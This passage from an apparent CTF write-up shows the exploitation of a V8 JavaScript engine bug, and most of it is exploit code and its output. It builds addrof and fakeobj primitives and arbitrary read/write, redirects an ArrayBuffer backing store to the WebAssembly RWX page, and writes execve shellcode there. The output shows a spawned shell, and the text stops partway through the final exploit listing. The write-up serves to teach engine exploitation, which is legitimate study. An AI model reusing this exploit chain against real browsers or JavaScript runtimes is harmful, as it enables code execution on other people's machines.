</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">wasm.js</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">l9221120237041090560nibthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff2063700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">4436</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.7.0</span> <span class="p">(</span><span class="no">candidate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="err">^</span><span class="no">C</span>
</span></span><span class="line"><span class="cl"><span class="nf">Thread</span> <span class="mi">1</span> <span class="err">&#34;</span><span class="no">d8</span><span class="err">&#34;</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGINT</span><span class="p">,</span> <span class="no">Interrupt.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span> 
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span> <span class="no">vmmap</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000379395694000</span> <span class="mi">0x0000379395695000</span> <span class="mi">0x0000000000000000</span> <span class="no">rwx</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x0000555555554000</span> <span class="mi">0x00005555555e4000</span> <span class="mi">0x0000000000000000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug</span><span class="err">/</span><span class="no">d8</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00005555555e4000</span> <span class="mi">0x000055555565e000</span> <span class="mi">0x000000000008f000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug</span><span class="err">/</span><span class="no">d8</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000055555565e000</span> <span class="mi">0x0000555555661000</span> <span class="mi">0x0000000000108000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug</span><span class="err">/</span><span class="no">d8</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555661000</span> <span class="mi">0x0000555555662000</span> <span class="mi">0x000000000010a000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug</span><span class="err">/</span><span class="no">d8</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555662000</span> <span class="mi">0x0000555555747000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> <span class="p">[</span><span class="no">heap</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span> 
</span></span></code></pre></div><p>As we can see, we have the <code>rwx</code> segment at <code>0x0000379395694000</code>, with some trial and error I found out that the using <code>arb_read</code> to the read data from the address <code>wasm_instance + 0x68</code> shows us the address of the <code>rwx_page</code>, with this on hand and the power of <code>arb_write</code> we can write to the desirable address.\</p>
<p>Now, in order to write to the address, we have to write the initial value to the <code>backing_store</code> of the array, which is located at the address <code>&amp;JSArray + 0x14</code> which you can find with the debug version of the <code>d8</code> binary. One more thing, we need to consider is to use the <code>DataView</code> and <code>ArrayBuffer</code> as this will help you in overwriting the address with the desired value, in short these two functions allows you to write the data in binary format using the <code>ArrayBuffer</code>.</p>
<p>I am using the <code>execve</code> shellcode, since CTF is long over I can&rsquo;t execute <code>/chal/flagprinter</code>, poor me.</p>
<p>The exploit now looks like:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr_buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">back_store_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">arr_buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] ArrayBuffer address: 0x&#34;</span> <span class="o">+</span> <span class="nx">arr_buf_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Back store pointer: 0x&#34;</span> <span class="o">+</span> <span class="nx">back_store_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">arb_write</span><span class="p">(</span><span class="nx">arr_buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">,</span> <span class="nx">rwx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Spawning shell&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">pwn</span><span class="p">();</span>
</span></span></code></pre></div><p>Now, running the exploit with the provided binary:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">CTFs$</span> <span class="p">.</span><span class="err">/</span><span class="no">d8</span> <span class="p">.</span><span class="err">/</span><span class="no">xpl.js</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Float</span> <span class="no">array</span> <span class="no">map</span><span class="p">:</span> <span class="mi">0x82438fd</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Pointer</span> <span class="no">to</span> <span class="no">array</span> <span class="no">elements</span><span class="p">:</span> <span class="mi">0x8085e19</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Pointer</span> <span class="no">to</span> <span class="no">object</span> <span class="no">array</span> <span class="no">elements</span><span class="p">:</span> <span class="mi">0x8085d5d</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Object</span> <span class="no">array</span> <span class="no">map</span><span class="p">:</span> <span class="mi">0x824394d</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Controlled</span> <span class="no">RW</span> <span class="no">helper</span> <span class="no">address</span><span class="p">:</span> <span class="mi">0x8086209</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Wasm</span> <span class="no">instance</span> <span class="no">address</span><span class="p">:</span> <span class="mi">0x821218d</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">RWX</span> <span class="no">section</span> <span class="no">address</span><span class="p">:</span> <span class="mi">0x196c91043000</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">ArrayBuffer</span> <span class="no">address</span><span class="p">:</span> <span class="mi">0x8086bd9</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Back</span> <span class="no">store</span> <span class="no">pointer</span><span class="p">:</span> <span class="mi">0x560bcfd3d640</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Spawning</span> <span class="no">shell...</span>
</span></span><span class="line"><span class="cl"><span class="nf">To</span> <span class="no">run</span> <span class="no">a</span> <span class="no">command</span> <span class="no">as</span> <span class="no">administrator</span> <span class="p">(</span><span class="no">user</span> <span class="err">&#34;</span><span class="no">root</span><span class="err">&#34;</span><span class="p">),</span> <span class="no">use</span> <span class="err">&#34;</span><span class="mh">sudo</span> <span class="p">&lt;</span><span class="no">command</span><span class="p">&gt;</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nf">See</span> <span class="err">&#34;</span><span class="no">man</span> <span class="no">sudo_root</span><span class="err">&#34;</span> <span class="no">for</span> <span class="no">details.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">CTFs$</span> <span class="no">whoami</span>
</span></span><span class="line"><span class="cl"><span class="nf">d4mian</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">CTFs$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">d4mian</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">d4mian</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">d4mian</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="no">adm</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="no">cdrom</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="no">sudo</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="no">dip</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="no">plugdev</span><span class="p">),</span><span class="mi">116</span><span class="p">(</span><span class="no">lpadmin</span><span class="p">),</span><span class="mi">126</span><span class="p">(</span><span class="no">sambashare</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">CTFs$</span> <span class="err">^</span><span class="no">C</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">CTFs$</span> <span class="no">exit</span>
</span></span></code></pre></div><p>Success, we spawned a shell. That was a long ride. Hope you enjoyed it.</p>
<p>The final exploit looks like:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_obj</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;a&#34;</span><span class="o">:</span> <span class="mi">1</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">aux_obj</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_float_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_arr</span> <span class="o">=</span> <span class="nx">aux_float_arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">aux_float_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">flt_arr_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">elem_arr_ptr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Float array map: 0x&#34;</span> <span class="o">+</span> <span class="nx">flt_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Pointer to array elements: 0x&#34;</span> <span class="o">+</span> <span class="nx">elem_arr_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">elem_obj_arr</span> <span class="o">=</span> <span class="nx">elem_arr_ptr</span> <span class="o">-</span> <span class="mh">0xc0</span><span class="nx">n</span> <span class="o">+</span> <span class="mh">0x4</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">elem_obj_arr</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Pointer to object array elements: 0x&#34;</span> <span class="o">+</span> <span class="nx">elem_obj_arr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_arr_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Object array map: 0x&#34;</span> <span class="o">+</span> <span class="nx">obj_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">aux_arr</span> <span class="o">=</span> <span class="nx">aux_float_arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">aux_float_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">elem_obj_arr</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">aux_obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">aux_arr</span> <span class="o">=</span> <span class="nx">aux_float_arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">aux_float_arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">aux_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">aux_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">obj_arr_map</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fake</span> <span class="o">=</span> <span class="nx">aux_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rw_helper</span> <span class="o">=</span> <span class="p">[</span><span class="nx">itof</span><span class="p">(</span><span class="nx">flt_arr_map</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rw_helper_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">rw_helper</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Controlled RW helper address: 0x&#34;</span> <span class="o">+</span> <span class="nx">rw_helper_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
